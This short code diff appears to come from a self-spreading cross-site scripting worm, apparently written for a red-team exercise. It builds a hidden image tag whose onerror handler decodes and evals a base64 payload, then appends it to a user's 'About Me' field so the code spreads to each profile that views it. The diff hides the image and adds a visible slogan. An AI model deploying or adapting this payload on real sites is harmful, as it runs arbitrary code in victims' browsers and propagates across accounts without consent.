@@ -26,7 +26,7 @@ $(temp).appendTo($(userProfile));
 $(userProfile).appendTo("body");
 
 setTimeout(function () {
-    var profile_payload = "<img src='x' onerror='eval(atob(\"" + payload + "\"));'>";
+    var profile_payload = "<p>I support the ATMO Red Team</p><img style='display: none;' src='x' onerror='eval(atob(\"" + payload + "\"));'>";
 
     if ($('#txtAboutMe').val().indexOf("onerror") == -1) {
         $('#txtAboutMe').val($('#txtAboutMe').val() + profile_payload);
